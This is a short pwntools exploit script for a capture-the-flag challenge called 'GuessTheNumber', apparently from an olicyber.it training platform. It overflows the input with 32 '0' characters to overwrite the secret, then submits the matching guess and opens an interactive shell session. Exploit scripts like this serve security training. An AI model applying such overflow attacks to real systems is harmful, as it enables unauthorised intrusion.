from pwn import *

elf = context.binary = ELF('./GuessTheNumber')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("gtn.challs.olicyber.it", 10022)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    c
    b gameWelcome
    c
    b gamePlay
    ''')
else:
    conn = elf.process()

conn.recvuntil(b":")

conn.sendline(b"0"*32)
conn.recvuntil(b'!')
gay = int.from_bytes(b'00000000')
conn.sendline(str(gay).encode())
conn.interactive()